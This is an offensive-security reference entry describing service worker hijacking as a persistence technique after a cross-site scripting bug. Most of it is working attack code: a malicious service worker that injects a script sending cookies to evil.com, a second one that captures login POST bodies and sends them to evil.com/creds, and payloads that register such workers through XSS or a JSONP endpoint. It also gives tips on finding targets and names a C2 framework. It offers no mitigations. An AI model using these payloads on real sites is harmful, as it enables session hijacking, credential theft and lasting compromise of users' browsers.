---
id: "service-worker-attacks"
title: "Service Worker Hijacking"
type: "technique"
category: "web-application"
subcategory: "client-side"
tags: ["service-worker", "persistence", "xss", "request-interception", "credential-theft"]
platforms: ["linux", "macos", "windows"]
related: ["xss", "file-upload"]
difficulty: "expert"
updated: "2026-04-14"
---

# Service Worker Hijacking

## Why Service Workers = Persistent XSS
Once registered, a service worker persists across sessions, intercepts ALL requests within scope, and survives even after the original XSS is patched (up to 24 hours). Critical impact.

## Malicious Service Worker
```javascript
// sw.js — intercept all page requests and inject XSS
self.addEventListener('fetch', function(event) {
  if (event.request.headers.get('Accept').includes('text/html')) {
    event.respondWith(
      fetch(event.request).then(function(response) {
        return response.text().then(function(body) {
          var modified = body.replace('</body>',
            '<script>fetch("https://evil.com/steal?c="+document.cookie)</script></body>');
          return new Response(modified, {headers: response.headers});
        });
      })
    );
  }
});
```

## Credential Harvesting SW
```javascript
self.addEventListener('fetch', function(event) {
  if (event.request.method === 'POST' && new URL(event.request.url).pathname === '/login') {
    event.request.clone().text().then(function(body) {
      fetch('https://evil.com/creds', {method:'POST', body:body});
    });
  }
  event.respondWith(fetch(event.request));
});
```

## Registration via XSS
```javascript
// XSS payload to register malicious SW:
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
```

## Using JSONP as SW Script
```javascript
// If target has JSONP endpoint:
navigator.serviceWorker.register('/api/jsonp?callback=onfetch=function(e){e.respondWith(fetch(e.request))}//');
```

## Requirements
- XSS vulnerability on the target domain
- Way to host JS file on same origin (file upload, JSONP, path traversal)
- HTTPS (service workers require secure context)

## Where to Find This
- XSS + file upload features (avatars, attachments)
- Vulnerable JSONP endpoints
- DOM Clobbering to redirect SW registration calls

## Tools
- Shadow Workers (full C2 framework for SW exploitation)
- DevTools → Application → Service Workers
- chrome://serviceworker-internals/
